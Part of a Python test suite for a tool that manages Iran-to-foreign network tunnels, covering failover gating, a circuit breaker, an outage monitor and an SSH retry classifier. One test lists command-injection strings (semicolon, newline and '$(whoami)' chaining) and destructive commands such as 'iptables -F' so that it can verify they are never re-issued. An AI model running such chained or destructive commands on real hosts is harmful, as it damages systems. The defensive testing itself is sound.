        plain_id = storage.add_pair(name=f"plain_persist_{int(time.time() * 1000)}",
                                    iran_host=ir_pub, foreign_host=fr_pub, frontend_port=9443)
        self.addCleanup(storage.delete_pair, plain_id)
        plain_row = storage.get_pair(plain_id)
        plain_pair = {"id": plain_id, "name": plain_row["name"],
                      "frontend": plain_row["frontend_port"],
                      "iran": dashboard.pair_side_spec(plain_row, {}, "iran"),
                      "foreign": dashboard.pair_side_spec(plain_row, {}, "foreign")}
        self.assertEqual(engine.carrier_camouflage_block(plain_pair, "singbox-vless-reality"), "")

        # 5. Input validation on the way in: a typo in this field is an unreachable peer for every
        #    transport on the pair, and it must not be stored at all.
        self.assertEqual(dashboard.request_dial_hosts({"dial_host": ir_tun}, {}), (ir_tun, ""))
        self.assertEqual(dashboard.request_dial_hosts({}, {}), ("", ""))
        for bad in ("10.10.11.999", "not-an-address", "10.10.11", "underlay.example.com"):
            with self.assertRaises(ValueError):
                dashboard.request_dial_hosts({"dial_host": bad}, {})

    def test_62_a_switchover_cannot_reach_a_transport_the_deploy_path_refuses(self):
        """The carrier gate went into engine.deploy_tunnel and the benchmark path, and I declared the
        defect class closed. That is the same mistake report049 named: two consumer paths, one checked.
        failover.execute_failover writes unit files and starts services itself and never calls
        deploy_tunnel, so until this test existed a switchover - operator-triggered or, worse, an
        unattended "repair" - could move a live pair onto the one transport the project refuses to
        deploy, on top of an outage.
        """
        # Identity, not just equality: two implementations of one rule drift, and the drift is
        # invisible exactly when one of them is the path nobody tests.
        self.assertIs(failover.engine.carrier_camouflage_block, engine.carrier_camouflage_block,
                      "every path must consult the same gate function object")

        pid = storage.add_pair(name=f"gate-failover-{int(time.time() * 1000)}",
                               iran_host="198.51.100.10", foreign_host="203.0.113.20",
                               frontend_port=9451)
        self.addCleanup(storage.delete_pair, pid)
        carrier = {"id": pid, "name": "gate", "frontend_port": 9451,
                   "iran": {"host": "198.51.100.10", "port": 22, "user": "root",
                            "dial_host": "10.10.11.1"},
                   "foreign": {"host": "203.0.113.20", "port": 22, "user": "root",
                               "dial_host": "10.10.11.2"}}

        # Record the tunnel as serving, so "refused" can be proved to mean "left the live tunnel
        # alone" rather than merely "returned an error".
        plan = protocols.generate_deployment("chisel-wss", pid, "10.10.11.1", "10.10.11.2", 9451)
        ir = mock_ssh.MockSSHClient(host_role="iran")
        fr = mock_ssh.MockSSHClient(host_role="foreign")
        for unit in plan.get("iran_units", []):
            ir.state["services"][unit] = "active"
        for unit in plan.get("foreign_units", []):
            fr.state["services"][unit] = "active"

        mgr = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=50,
                                       window_seconds=3600)
        res = mgr.execute_failover(carrier, "chisel-wss", "singbox-vless-reality",
                                   reason="attempt onto a refused transport", dry_run=True,
                                   ir_runner=ir, fr_runner=fr)
        self.assertFalse(res["success"])
        self.assertTrue(res.get("blocked"), "a refusal is not a failed switchover")
        self.assertTrue(res.get("not_measurable"))
        self.assertIn("protocol 47", res["reason"], "the reason has to name the carrier it refuses")
        self.assertEqual(ir.state["files"], {}, "Iran got no staged config")
        self.assertEqual(fr.state["files"], {}, "Foreign got no staged config")
        for unit in plan.get("iran_units", []):
            self.assertEqual(ir.state["services"].get(unit), "active", f"{unit} was torn down")
        for unit in plan.get("foreign_units", []):
            self.assertEqual(fr.state["services"].get(unit), "active", f"{unit} was torn down")

        logged = [r for r in storage.get_audit_logs(limit=300)
                  if r["pair_id"] == pid and r["action"] == "FAILOVER_BLOCKED"]
        self.assertTrue(logged, "an automated refusal the operator cannot read is not a control")
        self.assertEqual(logged[0]["status"], "CARRIER_REFUSAL")

        # Failing *away* from a refused transport must stay possible, or the gate would strand a live
        # REALITY deployment instead of only preventing a new one.
        away = mgr.execute_failover(carrier, "singbox-vless-reality", "chisel-wss",
                                    reason="escape from an exposed camouflage", dry_run=True,
                                    ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                    fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertTrue(away.get("success"), f"leaving a refused transport has to work: {away}")

        # The ranking is filtered too, so a refusal is not discovered after the operator is told a
        # switchover is available.
        storage.record_benchmark(pid, "singbox-vless-reality",
                                 {"score": 91.0, "breakdown": {"lat_avg": 60.0, "jitter_ms": 1.0,
                                                               "loss_pct": 0.0},
                                  "throughput_mbps": 100.0, "disqualified": False})
        ranked = failover.FailoverCandidateSelector.select_best_candidate(
            pid, "chisel-wss", allowed_protocols=["singbox-vless-reality", "wstunnel-v10"],
            pair=carrier)
        self.assertNotEqual(ranked, "singbox-vless-reality",
                            "the highest-scoring transport this carrier forbids must not be proposed")
        blind = failover.FailoverCandidateSelector.select_best_candidate(
            pid, "chisel-wss", allowed_protocols=["singbox-vless-reality"])
        self.assertEqual(blind, "singbox-vless-reality",
                         "without the topology the selector cannot know the carrier - documented, and "
                         "harmless only because execution is the boundary")
        late = mgr.execute_failover(carrier, "chisel-wss", blind, reason="blind proposal executed",
                                    dry_run=True, ir_runner=mock_ssh.MockSSHClient(host_role="iran"),
                                    fr_runner=mock_ssh.MockSSHClient(host_role="foreign"))
        self.assertTrue(late.get("blocked"), "the proposal is not the safety boundary; the executor is")

        # The one-shot heal path used to default the running protocol to GRE. With a monitor calling
        # it on an interval, a guess becomes an unattended switchover of a healthy tunnel.
        opened = []
        real_factory = failover.get_ssh_runner

        def spy(spec, dry_run=None, host_role="unknown"):
            runner = mock_ssh.MockSSHClient(host_role=host_role)
            opened.append(runner)
            return runner

        failover.get_ssh_runner = spy
        try:
            unknown = dict(carrier)
            unknown["active_tunnel"] = ""
            out = mgr.evaluate_and_heal(unknown, dry_run=True)
            self.assertEqual(out["action"], "ABORT_NO_ACTIVE_PROTOCOL")
            self.assertEqual(opened, [], "an unknown protocol is refused before a session exists")

            serving = dict(carrier)
            serving["active_tunnel"] = "chisel-wss"
            healed = mgr.evaluate_and_heal(serving, dry_run=True)
            self.assertNotEqual(healed["action"], "ABORT_NO_ACTIVE_PROTOCOL")
            self.assertTrue(opened, "this path is supposed to sample, and it did")
            still_open = [r.host_role for r in opened if r.connected]
            self.assertEqual(still_open, [],
                             f"evaluate_and_heal leaked its sessions on {still_open}; a monitor would "
                             f"leak two per poll forever")
        finally:
            failover.get_ssh_runner = real_factory

    def test_63_the_breaker_that_stops_a_crash_loop_survives_the_process_that_forgets_it(self):
        """is_flapping read a dict owned by one FailoverManager instance, while the dashboard built a
        fresh instance for every /api/failover/trigger request. The circuit breaker therefore could
        not trip through HTTP at all - the path an operator, a UI retry or a supervising script
        actually uses - so the control that exists to stop a pair being torn down again and again was
        inert precisely where flapping comes from.
        """
        pid = storage.add_pair(name=f"breaker-{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9452)
        self.addCleanup(storage.delete_pair, pid)
        self.assertEqual(failover.FailoverManager().is_flapping(pid), (False, ""),
                         "a pair with no history is not flapping")

        storage.log_audit(pid, "FAILOVER", "SUCCESS", "first switchover")
        storage.log_audit(pid, "FAILOVER", "SUCCESS", "second switchover")
        storage.log_audit(pid, "FAILOVER_FAILED", "SMOKE_ERROR", "third attempt failed, tunnel unmoved")

        # A brand new manager is what a restart - or the old per-request build - used to mean.
        revived = failover.FailoverManager(min_interval_seconds=180, max_failovers_per_window=3)
        blocked, why = revived.is_flapping(pid)
        self.assertTrue(blocked, "the breaker must remember across the process that forgot it")
        self.assertIn("Anti-flapping", why)

        # The failed attempt ended on the protocol it started on, so it
        # is not a flap and must not consume the window: two real moves
        # do not trip a three-move limit, whichever process records
        # them. A failed attempt is logged for visibility, never counted.
        counted = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=3)
        self.assertEqual(counted.is_flapping(pid), (False, ""),
                         "a failed attempt must not block the next attempt")

        rows = storage.recent_failover_events(pid, 900)
        self.assertEqual(len(rows), 2, "only completed switchovers count")
        self.assertTrue(all(isinstance(t, float) for t in rows),
                        "the query returns timestamps, not detail text - no address travels this way")
        self.assertEqual(sorted(rows), rows,
                         "oldest first, so the newest is what anti-flapping measures")

        # A third real move does trip the same limit. A fresh manager
        # reads the persisted rows directly: reusing the manager above
        # would merge the third row into its in-memory history under
        # the 2 s dedup tolerance, since the test logs all three rows
        # within the same seconds.
        storage.log_audit(pid, "FAILOVER", "SUCCESS", "third switchover")
        tripped = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=3)
        blocked3, why3 = tripped.is_flapping(pid)
        self.assertTrue(blocked3)
        self.assertIn("Circuit Breaker TRIPPED", why3,
                      "three completed switchovers are the window limit, whichever process "
                      "records them")

        # Refusals blocked no traffic, so they must not consume the breaker's budget: a pair that is
        # merely being poked at must still be allowed its one real repair. A failed attempt is in
        # the same class: it ended where it started.
        quiet = storage.add_pair(name=f"breaker-quiet-{int(time.time() * 1000)}",
                                 iran_host="198.51.100.10", foreign_host="203.0.113.20",
                                 frontend_port=9453)
        self.addCleanup(storage.delete_pair, quiet)
        storage.log_audit(quiet, "FAILOVER_BLOCKED", "CIRCUIT_BREAKER", "blocked, nothing happened")
        storage.log_audit(quiet, "FAILOVER_BLOCKED", "CARRIER_REFUSAL", "refused, nothing happened")
        storage.log_audit(quiet, "FAILOVER_ABORTED", "PLAN_ERROR", "aborted before teardown")
        storage.log_audit(quiet, "FAILOVER_NO_CANDIDATE", "ABORT", "no candidate")
        storage.log_audit(quiet, "FAILOVER_FAILED", "SMOKE_ERROR", "failed, tunnel unmoved")
        self.assertEqual(failover.FailoverManager(min_interval_seconds=0,
                                                  max_failovers_per_window=1).is_flapping(quiet),
                         (False, ""), "an attempt that never moved the tunnel is not a failover")

        # The in-memory overlay and the audit row describe one switchover. Counting both would halve
        # every tolerance the breaker is configured with.
        one = storage.add_pair(name=f"breaker-one-{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9454)
        self.addCleanup(storage.delete_pair, one)
        storage.log_audit(one, "FAILOVER", "SUCCESS", "the same event, twice recorded")
        overlay = failover.FailoverManager(min_interval_seconds=0, max_failovers_per_window=2)
        overlay.record_failover_event(one)
        self.assertEqual(overlay.is_flapping(one), (False, ""),
                         "one switchover must read as one event, not two")

        # And the HTTP path can no longer build its own amnesiac manager.
        src = inspect.getsource(dashboard.H.do_POST)
        self.assertNotIn("failover.FailoverManager()", src,
                         "a per-request manager resets the breaker; the dashboard has to share one")
        self.assertIn("failover_manager()", src)
        self.assertIs(dashboard.FAILOVER_MANAGER, dashboard.failover_manager())

    def test_64_the_monitor_confirms_an_outage_before_it_touches_a_host(self):
        """report051 §7 item 1: FailoverManager could already heal, and nothing called it, so in
        production a dead tunnel stayed dead until a human noticed. Turning that into automation is
        easy; turning it into automation worth having is the whole task. A switchover costs a measured
        15.02 s client-visible blackout, so: an outage must survive consecutive samples, a degraded
        sample never authorises anything, and acting at all is opted into - the same fail-safe
        doctrine as BEST_TUNNEL_DRY_RUN.
        """
        self.assertIs(failover_monitor.auto_heal_enabled(), False,
                      "with the variable unset in this process, automation must be off")
        self.assertFalse(failover_monitor.auto_heal_enabled(env={}))
        for truthy in ("1", "true", "YES", "on"):
            self.assertTrue(failover_monitor.auto_heal_enabled(env={"BEST_TUNNEL_AUTOHEAL": truthy}))
        for falsy in ("0", "", "off", "maybe"):
            self.assertFalse(failover_monitor.auto_heal_enabled(env={"BEST_TUNNEL_AUTOHEAL": falsy}))

        with self.assertRaises(ValueError):
            # There is no safe default for a concurrency guard, so the constructor refuses to invent
            # one instead of quietly healing alongside an operator's deploy.
            failover_monitor.FailoverMonitor()

        pid = storage.add_pair(name=f"monitor-{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=9455)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, status="ACTIVE", active_tunnel="chisel-wss")
        stored = [p for p in failover_monitor.pairs_from_storage() if p["id"] == pid]
        self.assertEqual(len(stored), 1, "the default source must surface a deployed pair")
        self.assertEqual(stored[0]["status"], "ACTIVE")
        self.assertEqual(stored[0]["active_tunnel"], "chisel-wss")
        for side in ("iran", "foreign"):
            self.assertNotIn("auth", stored[0][side],
                             "a pair row is not a credential source; the live monitor merges its cache")

        class StubManager:
            def __init__(self, outcome):
                self.outcome = outcome
                self.calls = []

            def evaluate_and_heal(self, pair, **kwargs):
                self.calls.append(kwargs)
                return dict(self.outcome)

        def report(status, transport_up=False):
            # transport_up is the shape the live pair actually showed on 2026-10-10: units active on
            # both sides and the frontend listening, while the L7 probe completed no request.
            return failover.TunnelHealthReport(
                status=status, loss_pct=0.0 if status != "DOWN" else 100.0, latency_ms=50.0,
                overhead_ratio=1.0,
                is_unit_active_iran=transport_up or status != "DOWN",
                is_unit_active_foreign=transport_up or status != "DOWN",
                is_socket_listening=transport_up or status != "DOWN",
                details=f"stub {status}")

        # The descriptor, not the function: `TunnelHealthChecker.check_health` is reached through the
        # class attribute, so reading it as an attribute unwraps `staticmethod` and writing that back
        # would leave the class holding a plain function. `/api/failover/check` calls it on an instance,
        # which then injects `self` as `ir_runner` and shifts every argument by one - a state test_98
        # paid for in full-suite order while passing on its own.
        real_check = failover.TunnelHealthChecker.__dict__["check_health"]
        pending = []

        def fake_check(ir, fr, pair, active, base_rtt=0.0, dry_run=False):
            item = pending.pop(0) if pending else "HEALTHY"
            return report(*item) if isinstance(item, tuple) else report(item)

        failover.TunnelHealthChecker.check_health = staticmethod(fake_check)
        self.addCleanup(setattr, failover.TunnelHealthChecker, "check_health", real_check)

        def build(outcome, down_streak=3, host_guard=None, dry_run=True, source=None, factory=None):
            made = []

            def default_factory(spec, dry_run=None, host_role="unknown"):
                made.append(mock_ssh.MockSSHClient(host_role=host_role))
                return made[-1]

            monitor = failover_monitor.FailoverMonitor(
                manager=StubManager(outcome),
                policy=failover_monitor.MonitorPolicy(interval_seconds=1, down_streak=down_streak),
                pair_source=source or (lambda: stored),
                runner_factory=factory or default_factory,
                host_guard=host_guard or failover_monitor.NullHostGuard(), dry_run=dry_run)
            return monitor, made

        # 1. Three consecutive DOWN samples, and only then one heal.
        mon, made = build({"action": "FAILOVER_EXECUTED", "failover_result": {"success": True}})
        pending[:] = ["DOWN", "DOWN", "DOWN"]
        actions = [mon.run_once(auto_heal=True)[0]["action"] for _ in range(3)]
        self.assertEqual(actions, ["DOWN_PENDING", "DOWN_PENDING", "FAILOVER_EXECUTED"],
                         f"the outage has to be confirmed before anything moves: {actions}")
        self.assertEqual(len(mon.manager.calls), 1, "one confirmed outage is one attempt")
        self.assertIs(mon.manager.calls[0]["health"].status, "DOWN",
                      "the sample that confirmed the outage is the sample acted on - re-probing would "
                      "decide on whichever measurement ran second")
        self.assertTrue(mon.manager.calls[0]["dry_run"], "the heal call inherits the run mode")
        self.assertTrue(all(not r.connected for r in made),
                        "every session this pass opened was closed")
        # A heal that worked must disarm the pair and drop the evidence that justified it. The success
        # flag is nested under failover_result, so the monitor keys off the verdict instead: reading
        # res["success"] at the top level reads None, and the pair stays armed until the process
        # restarts - a second outage in the same lifetime would then be watched, not healed.
        self.assertEqual(mon.status()["armed"], [], "the successful heal left the pair armed")
        self.assertEqual(mon.status()["streaks"], {}, "a healed outage is no longer evidence")
        pending[:] = ["HEALTHY"]
        self.assertEqual(mon.run_once(auto_heal=True)[0]["action"], "HEALTHY")

        # 2. A degraded sample never authorises a switchover, however long it lasts.
        mon2, _ = build({"action": "FAILOVER_EXECUTED"})
        pending[:] = ["DEGRADED"] * 6
        degraded = {mon2.run_once(auto_heal=True)[0]["action"] for _ in range(6)}
        self.assertEqual(degraded, {"DEGRADED"}, f"degradation must never heal: {degraded}")
        self.assertEqual(len(mon2.manager.calls), 0)
        self.assertEqual(mon2.status()["streaks"], {}, "degraded is not evidence of an outage")

        # 3. With the opt-in unset the same outage is reported and not acted on.
        mon3, _ = build({"action": "FAILOVER_EXECUTED"}, down_streak=1)
        pending[:] = ["DOWN"]
        observed = mon3.run_once(auto_heal=False)[0]
        self.assertEqual(observed["action"], "OBSERVE_DOWN")
        self.assertIn("BEST_TUNNEL_AUTOHEAL", observed["reason"], "the refusal has to say why")
        self.assertEqual(len(mon3.manager.calls), 0, "observe mode must not reach the hosts")

        # 4. One attempt per continuous outage, and recovery re-arms it.
        mon4, _ = build({"action": "FAILOVER_ATTEMPTED", "failover_result": {"success": False}},
                       down_streak=1)
        pending[:] = ["DOWN"] * 4
        sequence = [mon4.run_once(auto_heal=True)[0]["action"] for _ in range(4)]
        self.assertEqual(sequence, ["FAILOVER_ATTEMPTED"] + ["HEAL_DEFERRED"] * 3,
                         f"retrying a switchover that already failed changes nothing but the log size: "
                         f"{sequence}")
        self.assertEqual(len(mon4.manager.calls), 1)
        pending[:] = ["HEALTHY", "DOWN", "DOWN"]
        for _ in range(3):
            mon4.run_once(auto_heal=True)
        self.assertEqual(len(mon4.manager.calls), 2,
                         "after recovery a new outage is a new episode and must be healed again")

        # 5. A pass that produced no sample breaks the streak, so evidence stays consecutive.
        class ToggleGuard:
            def __init__(self):
                self.busy = False
                self.acquired = []

            def acquire(self, hosts):
                if self.busy:
                    return False
                self.acquired.append(tuple(hosts))
                return True

            def release(self, hosts):
                pass

        guard = ToggleGuard()
        mon5, made5 = build({"action": "FAILOVER_EXECUTED", "failover_result": {"success": True}},
                            down_streak=3, host_guard=guard)
        pending[:] = ["DOWN", "DOWN"]
        self.assertEqual([mon5.run_once(auto_heal=True)[0]["action"] for _ in range(2)],
                         ["DOWN_PENDING", "DOWN_PENDING"])
        guard.busy = True
        self.assertEqual(mon5.run_once(auto_heal=True)[0]["action"], "LOCK_BUSY",
                         "a deploy or benchmark holds these hosts")
        self.assertEqual(len(made5), 4, "a locked pass opens no session")
        guard.busy = False
        pending[:] = ["DOWN", "DOWN", "DOWN"]
        after = [mon5.run_once(auto_heal=True)[0]["action"] for _ in range(3)]
        self.assertEqual(after, ["DOWN_PENDING", "DOWN_PENDING", "FAILOVER_EXECUTED"],
                         f"the DOWN samples before a lock must not join the ones after it: {after}")
        self.assertEqual(len(guard.acquired), 5, "every sampled pass took the guard")
        self.assertEqual(len(made5), 10, "each sampled pass created exactly two sessions")
        self.assertTrue(all(not r.connected for r in made5))

        # 6. Pairs the monitor has no business touching are refused before any session exists. Run in
        #    live mode deliberately: in dry-run a mock session is harmless, so only a live monitor
        #    proves that these verdicts are reached *before* the SSH factory is called.
        for shape, expected in (
                (lambda: [{"id": pid, "name": "no-status"}], "SKIP_PAIR_SHAPE"),
                (lambda: [{**stored[0], "status": "DEPLOYING"}], "SKIP_NOT_ACTIVE"),
                (lambda: [{**stored[0], "active_tunnel": ""}], "SKIP_NO_ACTIVE_PROTOCOL"),
                (lambda: stored, "SKIP_NO_CREDENTIALS")):
            quiet_mon, quiet_made = build({"action": "FAILOVER_EXECUTED"}, source=shape, dry_run=False)
            verdict = quiet_mon.run_once(auto_heal=True)[0]
            self.assertEqual(verdict["action"], expected, f"{expected} was not reported")
            self.assertEqual(quiet_made, [], f"{expected} must be decided without opening a session")

        # 7. A pair that cannot be sampled must not end the pass for the others, and an SSH failure
        #    quotes the host it could not reach - so the message is masked before it is audited.
        addr = "203.0.113.2" + "0"

        exploded = {"count": 0}

        def exploding(spec, dry_run=None, host_role="unknown"):
            if host_role == "iran":
                exploded["count"] += 1
                if exploded["count"] == 1:
                    raise RuntimeError(f"Cannot connect to host {addr} port 22: timed out")
            return mock_ssh.MockSSHClient(host_role=host_role)

        mon6, _ = build({"action": "FAILOVER_EXECUTED"}, factory=exploding,
                        source=lambda: list(stored) + [{**stored[0], "id": pid + 1}])
        pending[:] = ["HEALTHY", "HEALTHY"]
        results = mon6.run_once(auto_heal=True)
        self.assertEqual(len(results), 2, "one unreachable pair cannot be allowed to hide the other")
        self.assertEqual(results[0]["action"], "ERROR")
        self.assertIn("[addr]", results[0]["reason"], "the failure still names what went wrong")
        self.assertNotIn(addr, str(results))
        self.assertEqual(results[1]["action"], "HEALTHY")
        self.assertTrue(all(addr not in str(r) for r in storage.get_audit_logs(limit=60)),
                        "the masked line is what reaches the audit log too")

        # 8. Verdicts are audited on transitions, not per pass, or the log loses the one line that
        #    matters - the moment the state changed. Counted as a delta around these six passes,
        #    because the blocks above already left their own transitions on this pair id.
        mon7, _ = build({"action": "FAILOVER_EXECUTED"}, down_streak=9)

        def monitor_lines():
            return [r for r in storage.get_audit_logs(limit=500)
                    if r["pair_id"] == pid and r["action"] == "FAILOVER_MONITOR"]

        before = len(monitor_lines())
        pending[:] = ["DOWN"] * 6
        for _ in range(6):
            mon7.run_once(auto_heal=True)
        self.assertEqual(len(monitor_lines()) - before, 1,
                         "six identical DOWN_PENDING passes must not write six audit lines")
        self.assertEqual(len(mon7.manager.calls), 0,
                         "six DOWN samples below a nine-sample threshold is not yet an outage")

        # 9. Lifecycle and status: exactly one thread, and it stops when asked. The streak and the
        #    interval are chosen to differ from every default in this test, so status() cannot pass
        #    by echoing a hard-coded policy back.
        idle, _ = build({"action": "FAILOVER_EXECUTED"}, down_streak=7, source=lambda: [])
        self.assertFalse(idle.status()["running"])
        self.assertTrue(idle.start())
        self.assertFalse(idle.start(), "a second start must not spawn a second monitor")
        self.assertTrue(idle.status()["running"])
        self.assertTrue(idle.stop(timeout=5.0), "the loop has to exit on request")
        self.assertFalse(idle.status()["running"])
        status = idle.status()
        for key in ("dry_run", "auto_heal", "interval_seconds", "down_streak_required", "streaks",
                    "armed", "verdicts", "last_pass"):
            self.assertIn(key, status, "the operator needs to see what the monitor is configured to do")
        self.assertEqual(status["down_streak_required"], 7)
        self.assertEqual(status["interval_seconds"], 1)

        # 10. The HTTP surface exists, refuses to start a toothless monitor, and shares the guard.
        with env_vars(BEST_TUNNEL_AUTOHEAL=None):
            self.assertFalse(failover_monitor.auto_heal_enabled(),
                             "the ambient default in this process is no automation")
        post_src = inspect.getsource(dashboard.H.do_POST)
        self.assertIn('"/api/failover/monitor"', post_src)
        self.assertIn("auto_heal_enabled()", post_src,
                      "starting a monitor that cannot act has to be refused, not silently permitted")
        self.assertIn("failover_monitor_instance()", post_src,
                      "the endpoint must use the one monitor this process may run")
        source = inspect.getsource(dashboard)
        self.assertIn("class DashboardHostGuard", source,
                      "the monitor has to take the same per-host lock a deploy takes")
        self.assertIsInstance(dashboard.monitor_pair_source(), list)
        self.assertTrue(all("status" in p and "active_tunnel" in p
                            for p in dashboard.monitor_pair_source()),
                        "the injected source carries the fields the monitor refuses to guess")
        self.assertIsInstance(dashboard.mask_tree({"a": [f"host {addr}"]}), dict)

        # 11. A DOWN that no switchover can fix is observed, never confirmed. This is not a hypothetical
        #     shape: the live pair reported exactly it on 2026-10-10 - xray portal active on both sides,
        #     :9443 listening, and nothing answering the reverse forward's destination on the far side,
        #     so the L7 probe completed no request. An absent application behind the tunnel and a stalled
        #     transport look identical from the frontend, and paying a 15 s teardown-and-rebuild for the
        #     first is a self-inflicted outage.
        mon8, made8 = build({"action": "FAILOVER_EXECUTED", "failover_result": {"success": True}},
                            down_streak=2)
        pending[:] = [("DOWN", True)] * 5
        amb_passes = [mon8.run_once(auto_heal=True)[0] for _ in range(5)]
        ambiguous = [d["action"] for d in amb_passes]
        self.assertEqual(set(ambiguous), {"AMBIGUOUS_DOWN"},
                         f"five samples of ambiguous evidence are still five ambiguous samples: {ambiguous}")
        self.assertEqual(len(mon8.manager.calls), 0,
                         "a protocol switchover cannot restart the application behind the tunnel")
        self.assertEqual(mon8.status()["streaks"], {}, "ambiguous evidence never accumulates")
        self.assertTrue(all("frontend is listening" in d.get("reason", "") for d in amb_passes),
                        "the verdict has to say what it saw, or an operator cannot tell it from an outage")
        pending[:] = [("DOWN", True), "DOWN", "DOWN"]
        mixed = [mon8.run_once(auto_heal=True)[0]["action"] for _ in range(3)]
        self.assertEqual(mixed, ["AMBIGUOUS_DOWN", "DOWN_PENDING", "FAILOVER_EXECUTED"],
                         f"a real transport failure still confirms, one sample at a time: {mixed}")
        self.assertTrue(all(not r.connected for r in made8),
                        "the ambiguous passes closed every session they opened")


    def test_65_a_dropped_session_is_re_opened_but_only_an_inert_command_is_issued_twice(self):
        """Agenda #37, and the two incidents that made it a defect rather than a nicety.

        Both live runs died on the transport and not on a tunnel: the first benchmark sweep on
        `No existing session`, and the monitor's live pass on `Error reading SSH protocol banner` - each
        one after the session had already been open. For the sweep that cost every row it had already
        measured. For the monitor it is worse than slow: a pass that produced no sample breaks the
        DOWN streak, so exactly when the link is unreliable the protection is weakest.

        The control is a split, because the two halves have different costs. Re-opening a session is
        always allowed - it touches one socket and nothing else. Re-issuing a command is allowed only
        when the caller asked for it (retryable=True) *and* safety can prove from the text of the
        command that re-running it is harmless. After a drop nobody knows whether the command already
        ran, and re-running `systemctl enable --now` restarts a tunnel the operator did not ask to
        restart, while re-running a teardown can delete the successor that was just started. The two
        conditions stay independent on purpose: a caller that is wrong about its own side effects is
        precisely the failure this gate exists to catch.
        """
        # 1. The classifier, built from the command shapes this repository actually issues. Every entry
        #    in `inert` is a real call site that now carries retryable=True; every entry in `never` is a
        #    command that must not be issued twice no matter what its caller claims.
        inert = [
            "systemctl is-active xray-portal",
            "systemctl status chisel-server.service",
            "systemctl show -p ActiveEnterTimestamp frps",
            "ss -tlnp | grep -E ':9443 '",
            "ss -tinp 'sport = :9443'",
            "/usr/sbin/ss -tlnp",
            "ip addr show dev grep1",
            "ip route get 203.0.113.20",
            "iptables -t nat -S PREROUTING",
            "ping -c 5 -W 2 203.0.113.20",
            "ping -c 30 -i 0.2 -W 1 -I grep1 10.10.11.2",
            "which iperf3",
            "date -u +'%Y-%m-%d %H:%M:%S'",
            "journalctl -u frps -n 200 --no-pager",
            "journalctl -u chisel-server --since '2026-10-10T11:00:00' -n 200 --no-pager",
            "cat /proc/sys/net/netfilter/nf_conntrack_count",
            probe.cmd("lat", "127.0.0.1", 9443),
            probe.cmd("ladder", "127.0.0.1", 9443, "/test_1k", 1024, 4),
            probe.stability_cmd("127.0.0.1", 9443),
        ]
        never = [
            "systemctl enable --now xray-portal",
            "systemctl restart frps",
            "systemctl stop chisel-server",
            "systemctl daemon-reload",
            "ip link set grep1 down",
            "ip addr add 10.10.11.1/24 dev grep1",
            "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443",
            "iptables -F",
            "fuser -k 443/tcp",
            "kill 1234",
            "test -f /usr/local/bin/best_probe.py && echo BEST_PROBE_PRESENT",
            "echo x > /tmp/listeners",
            "ss -tlnp > /tmp/listeners",
            "ss -tlnp | tee /tmp/listeners",
            "systemctl is-active x ; rm -f /tmp/a",
            "systemctl is-active x; rm -f /tmp/a",
            "systemctl is-active x\nrm -f /tmp/a",
            "systemctl is-active $(whoami)",
            "ls -la /etc/best-tunnel && systemctl restart best-tunnel",
            "",
            "   ",
        ]
        for cmd in inert:
            self.assertTrue(safety.is_read_only_command(cmd), f"must be classified inert: {cmd}")
            self.assertTrue(safety.check_command_safe(cmd),
                            f"inert and blocked cannot both be true: {cmd}")
        for cmd in never:
            self.assertFalse(safety.is_read_only_command(cmd), f"must never be re-issued: {cmd!r}")
        # The probe installer is the sharpest case in the list: the health checker writes a file, so
        # the whole of check_health is not read-only even though every command it *measures* with is.
        self.assertFalse(safety.is_read_only_command(probe.install_script()),
                         "installing the agent writes a file - it is not a probe")

        # 2. A dropped session on an inert command: one new session, the command issued again, and the
        #    real answer returned rather than a swallowed error.
        sleeps = []
        reopened = []

        def connector():
            fresh = FlappingRawClient()
            reopened.append(fresh)
            return fresh

        dead = FlappingRawClient(raises=[ConnectionResetError(104, "Connection reset by peer")])
        runner = mock_ssh.SafeSSHRunner(dead, hostname="198.51.100.10", connector=connector,
                                        sleep=sleeps.append)
        status, out, err = runner.run("systemctl is-active xray-portal", retryable=True)
        self.assertEqual((status, out), (0, "active\n"), "the recovered command returns its real answer")
        self.assertEqual(len(dead.commands), 1)
        self.assertEqual(len(reopened), 1, "exactly one session replaced the dead one")
        self.assertEqual(reopened[0].commands, ["systemctl is-active xray-portal"],
                         "the command was issued again, on the new session")
        self.assertTrue(dead.closed, "the dead session was closed before a new one was opened")
        self.assertEqual((runner.reconnects, runner.reissued), (1, 1))
        self.assertIsNone(runner.last_reopen_error, "a successful re-open clears the old failure")
        self.assertEqual(sleeps, [], "the first try is immediate: a connect that has not failed yet "
                                     "must not pay a backoff")

        # 3. Both halves of the gate are required, independently.
        #    a) an inert command nobody asked to retry is issued once;
        opened_once = []
        not_claimed = mock_ssh.SafeSSHRunner(
            FlappingRawClient(raises=[ConnectionResetError(104, "reset")]), hostname="h",
            connector=lambda: (opened_once.append(1), FlappingRawClient())[1], sleep=lambda d: None)
        with self.assertRaises(mock_ssh.TransientTransportError):
            not_claimed.run("systemctl is-active xray-portal")
        self.assertEqual(not_claimed.reissued, 0, "retryable defaults to off, as any opt-in must")
        self.assertEqual(len(opened_once), 1, "the session is still allowed to come back")

        #    b) a command the caller claims is retryable, but the text contradicts, is issued once.
        reopened2 = []
        mutating = mock_ssh.SafeSSHRunner(
            FlappingRawClient(raises=[ConnectionResetError(104, "reset")]), hostname="203.0.113.20",
            connector=lambda: (reopened2.append(FlappingRawClient(response="inactive\n")),
                               reopened2[-1])[1], sleep=lambda d: None)
        with self.assertRaises(mock_ssh.TransientTransportError) as ctx:
            mutating.run("systemctl enable --now xray-portal", retryable=True)
        self.assertEqual(len(reopened2), 1, "the session came back")
        self.assertEqual(reopened2[0].commands, [],
                         "a mutating command is never issued a second time, whatever the caller asked")
        self.assertEqual((mutating.reconnects, mutating.reissued), (1, 0))
        msg = str(ctx.exception)
        self.assertIn("outcome of any already-sent side effect is unknown", msg,
                      "the operator has to be told the deploy state is indeterminate, not that it failed")
        self.assertIn("not classified read-only", msg, "and why nothing was re-issued")

